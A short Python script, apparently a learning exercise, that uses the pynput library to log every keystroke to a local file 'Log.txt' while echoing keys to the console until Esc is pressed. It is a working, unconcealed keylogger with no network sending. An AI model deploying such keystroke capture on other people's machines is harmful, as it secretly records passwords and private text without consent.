from pynput import keyboard

def on_press(key):
    file1 = open("Log.txt","a")
    try:
        print('alphanumeric key {0} pressed'.format(key.char))
        file1.write(key.char + '\n')
    except AttributeError:
        print('special key {0} pressed'.format(key))
        file1.write('{0}\n'.format(key))
    finally:
        file1.close()

def on_release(key):
    print('{0} released'.format(key))
    if key == keyboard.Key.esc:
        # Stop listener
        return False

def clearFile():
    file1 = open("Log.txt","w")
    file1.write('')
    file1.close()
    
# Collect events until released
clearFile()
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
